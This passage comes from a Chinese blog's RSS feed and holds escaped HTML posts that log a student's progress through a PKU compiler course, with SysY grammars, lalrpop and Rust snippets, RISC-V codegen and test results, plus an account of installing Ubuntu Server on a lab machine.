RelExp        ::= AddExp | RelExp (&amp;quot;&amp;lt;&amp;quot; | &amp;quot;&amp;gt;&amp;quot; | &amp;quot;&amp;lt;=&amp;quot; | &amp;quot;&amp;gt;=&amp;quot;) AddExp;
EqExp         ::= RelExp | EqExp (&amp;quot;==&amp;quot; | &amp;quot;!=&amp;quot;) RelExp;
LAndExp       ::= EqExp | LAndExp &amp;quot;&amp;amp;&amp;amp;&amp;quot; EqExp;
LOrExp        ::= LAndExp | LOrExp &amp;quot;||&amp;quot; LAndExp;
ConstExp      ::= Exp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;差点晕😴...又是一个大工程...&lt;/p&gt;
&lt;p&gt;我梳理一下: 这回增加了常量和变量的声明(Decl)&lt;/p&gt;
&lt;h2&gt;常量&lt;/h2&gt;
&lt;p&gt;循序渐进,先来看常量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Decl          ::= ConstDecl;
ConstDecl     ::= &amp;quot;const&amp;quot; BType ConstDef {&amp;quot;,&amp;quot; ConstDef} &amp;quot;;&amp;quot;;
BType         ::= &amp;quot;int&amp;quot;;
ConstDef      ::= IDENT &amp;quot;=&amp;quot; ConstInitVal;
ConstInitVal  ::= ConstExp;

Block         ::= &amp;quot;{&amp;quot; {BlockItem} &amp;quot;}&amp;quot;;
BlockItem     ::= Decl | Stmt;

LVal          ::= IDENT;
PrimaryExp    ::= &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; | LVal | Number;

ConstExp      ::= Exp;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;词法/语法分析&lt;/h3&gt;
&lt;p&gt;本节的 EBNF 中出现了一种新的表示: &lt;code&gt;{ ... }&lt;/code&gt;, 这代表花括号内包含的项可被重复 0 次或多次.&lt;/p&gt;
&lt;p&gt;为了解析&lt;code&gt;{ }&lt;/code&gt; 表示的数组,我查阅了&lt;a href=&quot;https://lalrpop.github.io/lalrpop/tutorial/index.html&quot;&gt;lalrpop的手册&lt;/a&gt;,以及一些&lt;a href=&quot;https://github.com/lalrpop/lalrpop/blob/master/lalrpop/src/parser/lrgrammar.lalrpop&quot;&gt;示例&lt;/a&gt;, 得知可以使用 * 或? 来匹配&lt;/p&gt;
&lt;p&gt;但是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;ConstDecl     ::= &amp;quot;const&amp;quot; BType ConstDef {&amp;quot;,&amp;quot; ConstDef} &amp;quot;;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;怎么解析?我在示例中找到了:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Plus&amp;lt;T&amp;gt;: Vec&amp;lt;T&amp;gt; = {
    &amp;lt;mut v:(&amp;lt;T&amp;gt; &amp;quot;+&amp;quot;)*&amp;gt; &amp;lt;e:T?&amp;gt; =&amp;gt; match e {
        None =&amp;gt; v,
        Some(e) =&amp;gt; { v.push(e); v }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以及
&lt;a href=&quot;https://github.com/lalrpop/lalrpop/blob/master/doc/calculator/src/calculator6.lalrpop&quot;&gt;https://github.com/lalrpop/lalrpop/blob/master/doc/calculator/src/calculator6.lalrpop&lt;/a&gt; 出现了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pub Exprs = Comma&amp;lt;Expr&amp;gt;;

Comma&amp;lt;T&amp;gt;: Vec&amp;lt;T&amp;gt; = { // (0)
    &amp;lt;v:(&amp;lt;T&amp;gt; &amp;quot;,&amp;quot;)*&amp;gt; &amp;lt;e:T?&amp;gt; =&amp;gt; match e { // (1)
        None=&amp;gt; v,
        Some(e) =&amp;gt; {
            let mut v = v;
            v.push(e);
            v
        }
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;照猫画虎即可.&lt;/p&gt;
&lt;h3&gt;句法分析&lt;/h3&gt;
&lt;p&gt;我需要在抽象语法树中引入&lt;strong&gt;符号表&lt;/strong&gt; .&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;具体来说, 符号表需要支持如下操作:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;插入符号定义:&lt;/strong&gt; 向符号表中添加一个常量符号, 同时记录这个符号的常量值, 也就是一个 32 位整数.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;确认符号定义是否存在:&lt;/strong&gt; 给定一个符号, 查询符号表中是否存在这个符号的定义.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;查询符号定义:&lt;/strong&gt; 给定一个符号表中已经存在的符号, 返回这个符号对应的常量值.
在遇到常量声明语句时, 你应该遍历 AST, 直接算出语句右侧的 &lt;code&gt;ConstExp&lt;/code&gt; 的值, 得到一个 32 位整数, 然后把这个常量定义插入到符号表中.
在遇到 &lt;code&gt;LVal&lt;/code&gt; 时, 你应该从符号表中查询这个符号的值, 然后用查到的结果作为常量求值/IR 生成的结果. 如果没查到, 说明 SysY 程序出现了语义错误, 也就是程序里使用了未定义的常量.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;那么, 我上一章节写的表达式在编译期间执行求值的代码就可以派上用场了!&lt;/p&gt;
&lt;p&gt;在执行表达式求值时,需要将符号表传进去,于是我重构了代码.&lt;/p&gt;
&lt;h2&gt;变量和赋值&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Decl          ::= ConstDecl | VarDecl;
ConstDecl     ::= ...;
BType         ::= ...;
ConstDef      ::= ...;
ConstInitVal  ::= ...;
VarDecl       ::= BType VarDef {&amp;quot;,&amp;quot; VarDef} &amp;quot;;&amp;quot;;
VarDef        ::= IDENT | IDENT &amp;quot;=&amp;quot; InitVal;
InitVal       ::= Exp;

...

Block         ::= ...;
BlockItem     ::= ...;
Stmt          ::= LVal &amp;quot;=&amp;quot; Exp &amp;quot;;&amp;quot;
                | &amp;quot;return&amp;quot; Exp &amp;quot;;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;变量与常量要分开处理.在遇到 &lt;code&gt;LVal&lt;/code&gt; 时, 你需要从符号表中查询这个符号的信息, 然后用查到的结果作为常量求值/IR 生成的结果. 注意, 如下情况属于语义错误:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在进行常量求值时, 从符号表里查询到了变量而不是常量.&lt;/li&gt;
&lt;li&gt;在处理赋值语句时, 赋值语句左侧的 &lt;code&gt;LVal&lt;/code&gt; 对应一个常量, 而不是变量.&lt;/li&gt;
&lt;li&gt;其他情况, 如符号重复定义, 或者符号未定义.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于常量的定义我们直接求值,而对于变量的定义,我们必须引入三种新的指令: &lt;code&gt;alloc&lt;/code&gt;, &lt;code&gt;load&lt;/code&gt; 和 &lt;code&gt;store&lt;/code&gt;:&lt;/p&gt;
&lt;h3&gt;IR生成&lt;/h3&gt;
&lt;p&gt;对于&lt;code&gt;alloc&lt;/code&gt;,有相应的接口:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;let new_var = func_data.dfg_mut().new_value() .alloc(Type::get_i32());
let store = func_data.dfg_mut().new_value().store(val, new_var);
let load = func_data.dfg_mut().new_value().load(var_info.dest);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这并没有出现的koopa ir文档的示例方法里面.不过可以猜到.&lt;/p&gt;
&lt;p&gt;更新AST后,针对koopa的测试一下子就通过了:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 39.88s
running test &amp;quot;00_const&amp;quot; ... PASSED
running test &amp;quot;01_const_expr&amp;quot; ... PASSED
running test &amp;quot;02_multiple_consts&amp;quot; ... PASSED
running test &amp;quot;03_complex_const&amp;quot; ... PASSED
running test &amp;quot;04_var&amp;quot; ... PASSED
running test &amp;quot;05_var_init&amp;quot; ... PASSED
running test &amp;quot;06_var_expr&amp;quot; ... PASSED
running test &amp;quot;07_var_main&amp;quot; ... PASSED
running test &amp;quot;08_multiple_vars&amp;quot; ... PASSED
running test &amp;quot;09_complex_vars&amp;quot; ... PASSED
running test &amp;quot;10_assign&amp;quot; ... PASSED
running test &amp;quot;11_assign_read&amp;quot; ... PASSED
running test &amp;quot;12_multiple_assigns&amp;quot; ... PASSED
running test &amp;quot;13_complex&amp;quot; ... PASSED
PASSED (14/14)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;目标代码生成&lt;/h3&gt;
&lt;p&gt;这是本节的理论难点了,需要具备操作系统内核的基础知识:栈帧.不过这并不能难倒我,因为我学过CS:APP.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;另外本节还介绍了&lt;code&gt;call&lt;/code&gt; &lt;code&gt;ret&lt;/code&gt;伪指令相应的RISC-V真实汇编代码的原理,我仅是粗略看了一眼.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在IR生成中,本节没有充分利用寄存器,而是将每个运算结果都存储在内存(具体来说是栈帧)中,因此对应着汇编语言的栈指针操作.&lt;/p&gt;
&lt;p&gt;按照文档给出的步骤,首先我需要扫描一遍函数中的所有指令,计算出所需栈空间,将栈顶指针sp退栈. &lt;code&gt;i32&lt;/code&gt;占据4字节,但RISC-V要求16字节(double word)对齐(在CS:APP的alloclab中,x86也有类似的要求).&lt;/p&gt;
&lt;p&gt;还需要一个变量来统计使用的情况,产生一个i32值,这个变量就加上4,最后用完刚好栈满.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;lw&lt;/code&gt;和&lt;code&gt;sw&lt;/code&gt;对应load和store.&lt;/p&gt;
&lt;p&gt;最后,随着&lt;code&gt;ret&lt;/code&gt;栈顶指针sp加回去.&lt;/p&gt;
&lt;p&gt;之前我的代码是以&lt;code&gt;ret&lt;/code&gt;语句为导向DFS展开,但现在不行了,只能遍历所有实例.经过长达一天的重构折磨,也参考了一下别人的代码(&lt;a href=&quot;https://github.com/AsdOkuu/Compiler-25-Spring/commit/2f2cb9b92aaf15be984fb41160c698965e2dd90c)%E5%88%AB%E4%BA%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%86%99%E5%BE%97%E5%A4%AA%E5%B1%8E%E5%B1%B1%E4%BA%86,%E4%B8%8D%E8%BF%87%E6%80%9D%E8%B7%AF%E6%98%AF%E5%AF%B9%E7%9A%84.%E6%88%91%E5%8F%AA%E5%A5%BD%E5%B0%86%E6%88%91%E4%B9%8B%E5%89%8D%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%88%86%E9%85%8D%E5%88%A0%E5%8E%BB&quot;&gt;https://github.com/AsdOkuu/Compiler-25-Spring/commit/2f2cb9b92aaf15be984fb41160c698965e2dd90c)别人的代码写得太屎山了,不过思路是对的.我只好将我之前的寄存器分配删去&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;我注意到&lt;code&gt;koopa::ir&lt;/code&gt;中的&lt;code&gt;Value&lt;/code&gt;具有&lt;code&gt;Hash&lt;/code&gt;特型,而每条语句都有自己的&lt;code&gt;Value&lt;/code&gt;,所以用&lt;code&gt;HashMap&amp;lt;Value,u32&amp;gt;&lt;/code&gt;来存取它们的位置,从而实现&lt;code&gt;load&lt;/code&gt;和&lt;code&gt;store&lt;/code&gt;.重构的过程是痛苦的.&lt;/p&gt;
&lt;p&gt;另一个设计是用一个&lt;code&gt;Context&lt;/code&gt;结构体存储函数的上下文信息:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;struct Context&amp;lt;&amp;#39;a&amp;gt; {
  pub func_data: &amp;amp;&amp;#39;a FunctionData,
  pub offset: HashMap&amp;lt;Value, u32&amp;gt;,
  pub stack_size: u32,
  pub inst: Option&amp;lt;Value&amp;gt;,
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使得对&lt;code&gt;values::*&lt;/code&gt;的trait实现时传参比较方便.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 19.75s
running test &amp;quot;00_const&amp;quot; ... PASSED
running test &amp;quot;01_const_expr&amp;quot; ... PASSED
running test &amp;quot;02_multiple_consts&amp;quot; ... PASSED
running test &amp;quot;03_complex_const&amp;quot; ... PASSED
running test &amp;quot;04_var&amp;quot; ... PASSED
running test &amp;quot;05_var_init&amp;quot; ... PASSED
running test &amp;quot;06_var_expr&amp;quot; ... PASSED
running test &amp;quot;07_var_main&amp;quot; ... PASSED
running test &amp;quot;08_multiple_vars&amp;quot; ... PASSED
running test &amp;quot;09_complex_vars&amp;quot; ... PASSED
running test &amp;quot;10_assign&amp;quot; ... PASSED
running test &amp;quot;11_assign_read&amp;quot; ... PASSED
running test &amp;quot;12_multiple_assigns&amp;quot; ... PASSED
running test &amp;quot;13_complex&amp;quot; ... PASSED
PASSED (14/14)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此,作用域和语句块也呼之欲出了.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 18 Aug 2025 16:00:00 GMT</pubDate></item><item><title>实体机安装Ubuntu</title><link>https://tankimzeg.top/blog/distro/ubuntu-server-installation/</link><guid isPermaLink="true">https://tankimzeg.top/blog/distro/ubuntu-server-installation/</guid><description>记一次实体机安装Ubuntu Server</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/distro/ubuntu-server-installation/&quot;&gt;https://tankimzeg.top/blog/distro/ubuntu-server-installation/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;学校的老师委托我去实验室给电脑装系统,还要搬到另一个校区来&lt;del&gt;充当免费劳动力了&lt;/del&gt;.点名要安装Ubuntu.我还是第一次在实体机上安装系统.&lt;/p&gt;
&lt;p&gt;首先要自己制作启动U盘.我找了个旧U盘,容量只有3.5G,臃肿的Ubuntu桌面至少要4G以上.所以我只好安装Server版.&lt;/p&gt;
&lt;p&gt;刚到学校,中午都没休息,我就直接出发去另一个校区了.来到机房,一台ThinkServer,主机上都是灰尘,烦得很.插上显示器,猛按Delete和F12,听见滴的一声进入BIOS界面.&lt;/p&gt;
&lt;p&gt;我太着急了,这里忘了拍照记录.跟网上的界面不太一样,反正找到Boot相关的,根据操作指示把U盘移动到最上面,重启.&lt;/p&gt;
&lt;p&gt;我当时的U盘里面是UBUNTU 20.04,而且机器原来就有Windows系统.不知道是不是这个原因,总是装不进去.我不太记得具体是哪个步骤了.如果是磁盘格式的问题,按理来说直接格式化就行了啊,我看别的GUI界面都是有这个选项的,很奇怪.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646508559.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646532430.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;事实又一次证明,装机装系统不能下午开始搞,更不能晚上开始搞.没办法,我从下午搞到旁晚.断了一会电,到了晚上,又试一次,之前出问题的那个步骤过去了,到了设置用户名和密码的步骤,结果又不行了.重启,又是一直出错的那个地方过不去.&lt;/p&gt;
&lt;p&gt;进去shell, 靠着DeepSeek给出的方案手动格式化磁盘,也不明所以.另一边,我看网上说装新板的UBUNTU就成功了.虽然问题不一样,实在没法了,我重新下了Ubuntu Server 24.04,.iso大小直接从20.04的1G多变成了3.2G,真是逆天.&lt;/p&gt;
&lt;p&gt;不知道是我手动格式化磁盘的原因,还是更新发行版的原因,这次顺利安装了...&lt;/p&gt;
&lt;p&gt;安装完成~~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646555174.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;第二天搬到办公室,插上网线,又配置了一下网卡,顺利连上网了.&lt;/p&gt;
&lt;p&gt;连上网之后,安装桌面环境.我参考了 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/373773218&quot;&gt;如何在Ubuntu服务器上安装桌面环境&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;GNOME桌面下载中~~
&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646492375.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;成功点亮!顺便安装一个远程桌面,服务一条龙.主机也是一直搬来搬去的,累鼠我了.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;运维的基本操作,我早已无师自通了&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;机房的其他主机:好炫酷啊,啥时候我也装一台,羡慕了~&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646450425.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;一个超大的机箱:&lt;/em&gt;
&lt;img src=&quot;https://tankimzeg.top/attachments/%E5%AE%89%E8%A3%85Ubuntu-1756646460374.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 16 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv3：表达式 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv3/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv3/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv3/&quot;&gt;https://tankimzeg.top/blog/compiler/lv3/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;这章将处理这样的像C语言里面一样行为的表达式:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main() { return 1 + 2 * -3; }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;一元表达式&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Stmt        ::= &amp;quot;return&amp;quot; Exp &amp;quot;;&amp;quot;;

Exp         ::= UnaryExp;
PrimaryExp  ::= &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; | Number;
Number      ::= INT_CONST;
UnaryExp    ::= PrimaryExp | UnaryOp UnaryExp;
UnaryOp     ::= &amp;quot;+&amp;quot; | &amp;quot;-&amp;quot; | &amp;quot;!&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我目前的实践方式是直接捕捉表达式执行求值, 这其实算是一种编译优化了.如果忠于源码,则要逐句翻译,略显繁琐.在以后的课程中绕不开的.我需要重新组织代码,为每个Exp语句实现&lt;code&gt;compile&lt;/code&gt;方法,进而最后为&lt;code&gt;ir::Program&lt;/code&gt;实现&lt;code&gt;compile&lt;/code&gt;方法,例如这位的代码🤣:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AsdOkuu/Compiler-25-Spring/commit/7c50d8f5ee37380018313b3ae43fbdbcefc5dfa6&quot;&gt;https://github.com/AsdOkuu/Compiler-25-Spring/commit/7c50d8f5ee37380018313b3ae43fbdbcefc5dfa6&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这天(8.17),我在保留执行表达式的函数的同时, 另外重构了代码, 逐句翻译了源代码.&lt;/p&gt;
&lt;h2&gt;算术表达式&lt;/h2&gt;
&lt;p&gt;来到算术表达式, 我依旧按照 &lt;del&gt;enfp&lt;/del&gt; ebnf 的框架和命名去拓展ast. 有了 一元表达式 的经历, 简单的拓展不是问题.&lt;/p&gt;
&lt;h2&gt;比较和逻辑表达式&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Exp         ::= LOrExp;
PrimaryExp  ::= ...;
Number      ::= ...;
UnaryExp    ::= ...;
UnaryOp     ::= ...;
MulExp      ::= ...;
AddExp      ::= ...;
RelExp      ::= AddExp | RelExp (&amp;quot;&amp;lt;&amp;quot; | &amp;quot;&amp;gt;&amp;quot; | &amp;quot;&amp;lt;=&amp;quot; | &amp;quot;&amp;gt;=&amp;quot;) AddExp;
EqExp       ::= RelExp | EqExp (&amp;quot;==&amp;quot; | &amp;quot;!=&amp;quot;) RelExp;
LAndExp     ::= EqExp | LAndExp &amp;quot;&amp;amp;&amp;amp;&amp;quot; EqExp;
LOrExp      ::= LAndExp | LOrExp &amp;quot;||&amp;quot; LAndExp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到, 小类的&lt;code&gt;Exp&lt;/code&gt;还是表现出这样的两种结构.于是我忽然灵机一动, 重构为相同的框架: &lt;code&gt;Single&lt;/code&gt; 和 &lt;code&gt;Binary&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Binary&lt;/code&gt; 接收泛型, 泛型需绑定 &lt;code&gt;Compile&lt;/code&gt; trait. 至此豁然开朗!简化了大量&lt;code&gt;match&lt;/code&gt; 逻辑的代码!这就是在Rust中实现其他编程语言中继承的技巧.&lt;/p&gt;
&lt;p&gt;运行测试:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;autotest -koopa -s lv3 /root/compiler/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;发现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;...
running test &amp;quot;23_lor&amp;quot; ... WRONG ANSWER
your answer:
11
running test &amp;quot;24_land&amp;quot; ... WRONG ANSWER
your answer:
0
running test &amp;quot;25_int_min&amp;quot; ... PASSED
running test &amp;quot;26_parentheses&amp;quot; ... PASSED
running test &amp;quot;27_complex_binary&amp;quot; ... PASSED
WRONG ANSWER (26/28)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;23 和 24 测试样例是什么情况?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;// /opt/bin/testcases/lv3/23_lor.c
int main() {
  return 11 || 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;// /opt/bin/testcases/lv3/24_land.c
int main() {
  return 2 &amp;amp;&amp;amp; 4;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原来&lt;code&gt;Binary::Or&lt;/code&gt;是按位或; &lt;code&gt;Binary::And&lt;/code&gt;是按位与.&lt;/p&gt;
&lt;p&gt;如果要复现短路特性的话, 必须要在编译时执行表达式,根据结果判断. 目前, 虽然我之前有写了一点点表达式的执行函数, 但已经失修,应放到后面编译优化环节专门实现.&lt;/p&gt;
&lt;p&gt;所以我逐句执行判断逻辑.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 19.54s
running test &amp;quot;00_pos&amp;quot; ... PASSED
running test &amp;quot;01_neg_0&amp;quot; ... PASSED
running test &amp;quot;02_neg_2&amp;quot; ... PASSED
running test &amp;quot;03_neg_max&amp;quot; ... PASSED
running test &amp;quot;04_not_0&amp;quot; ... PASSED
running test &amp;quot;05_not_10&amp;quot; ... PASSED
running test &amp;quot;06_complex_unary&amp;quot; ... PASSED
running test &amp;quot;07_add&amp;quot; ... PASSED
running test &amp;quot;08_add_neg&amp;quot; ... PASSED
running test &amp;quot;09_sub&amp;quot; ... PASSED
running test &amp;quot;10_sub_neg&amp;quot; ... PASSED
running test &amp;quot;11_mul&amp;quot; ... PASSED
running test &amp;quot;12_mul_neg&amp;quot; ... PASSED
running test &amp;quot;13_div&amp;quot; ... PASSED
running test &amp;quot;14_div_neg&amp;quot; ... PASSED
running test &amp;quot;15_mod&amp;quot; ... PASSED
running test &amp;quot;16_mod_neg&amp;quot; ... PASSED
running test &amp;quot;17_lt&amp;quot; ... PASSED
running test &amp;quot;18_gt&amp;quot; ... PASSED
running test &amp;quot;19_le&amp;quot; ... PASSED
running test &amp;quot;20_ge&amp;quot; ... PASSED
running test &amp;quot;21_eq&amp;quot; ... PASSED
running test &amp;quot;22_ne&amp;quot; ... PASSED
running test &amp;quot;23_lor&amp;quot; ... PASSED
running test &amp;quot;24_land&amp;quot; ... PASSED
running test &amp;quot;25_int_min&amp;quot; ... PASSED
running test &amp;quot;26_parentheses&amp;quot; ... PASSED
running test &amp;quot;27_complex_binary&amp;quot; ... PASSED
PASSED (28/28)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此, Lv3 全部通过!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 14 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv2：目标代码生成 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv2/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv2/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv2/&quot;&gt;https://tankimzeg.top/blog/compiler/lv2/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;MaxXing非常贴心,不只是Rust使用者有接口, C系也有.作者为此课程真是呕心沥血了,十分敬重.&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;https://godbolt.org/&quot;&gt;Compiler Explorer&lt;/a&gt;你可以在网站右侧的汇编输出窗口选择使用 “RISC-V rv32gc clang (trunk)” 编译器, 然后将编译选项设置为 &lt;code&gt;-O3 -g0&lt;/code&gt;, 并查看窗口内的汇编输出.&lt;/p&gt;
&lt;p&gt;  &lt;a href=&quot;https://pku-minic.github.io/online-doc/#/misc-app-ref/riscv-insts&quot;&gt;RISC-V 指令速查&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于只有&lt;code&gt;return &amp;lt;ret_val&amp;gt;;&lt;/code&gt;的函数,我们只需要解析&lt;code&gt;program&lt;/code&gt;的返回值,生成这样的汇编:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;	.text
	.globl main
main:
	li a0, 0
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试文件在 &lt;code&gt;/opt/testcase&lt;/code&gt; 里面.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一开始我把a0寄存器写成s0了,找了很久的bug😭&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 25.17s
running test &amp;quot;0_main&amp;quot; ... PASSED
running test &amp;quot;1_comments&amp;quot; ... PASSED
running test &amp;quot;2_int_dec&amp;quot; ... PASSED
running test &amp;quot;3_int_oct&amp;quot; ... PASSED
running test &amp;quot;4_int_hex&amp;quot; ... PASSED
running test &amp;quot;5_compact&amp;quot; ... PASSED
running test &amp;quot;6_whitespaces&amp;quot; ... PASSED
PASSED (7/7)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我顺便重构了一下代码,轻松通过了!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 13 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv1：main函数 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv1/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv1/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv1/&quot;&gt;https://tankimzeg.top/blog/compiler/lv1/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;本课程的编译对象 SysY语言是一种简单版的C语言.&lt;/p&gt;
&lt;p&gt;作为一种编程语言,它有如下规范:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;词法规范&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标识符&lt;code&gt;IDENT&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;数值常量整型数&lt;code&gt;INT_CONST&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;注释&lt;code&gt;// /* */&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;语法规范&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开始符号为 &lt;code&gt;CompUnit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt; CompUnit ::= FuncDef;
 FuncDef ::= FuncType IDENT &amp;quot;()&amp;quot; Block;
 FuncType ::= &amp;quot;int&amp;quot;;
 
 Block ::= &amp;quot;{}&amp;quot; Stmt;
 Stmt ::= &amp;quot;return&amp;quot; Number &amp;quot;;&amp;quot;;
 Number ::= INT_CONST ;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;语义规范
&lt;code&gt;INT_CONST&lt;/code&gt;的范围为$[0,2^{31}-1]$, 不包含负号.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以看出, SysY语言是简单版的C语言.&lt;/p&gt;
&lt;h2&gt;编译器的结构&lt;/h2&gt;
&lt;p&gt;编译器把源代码变成可执行文件的过程:&lt;/p&gt;
&lt;ol&gt;
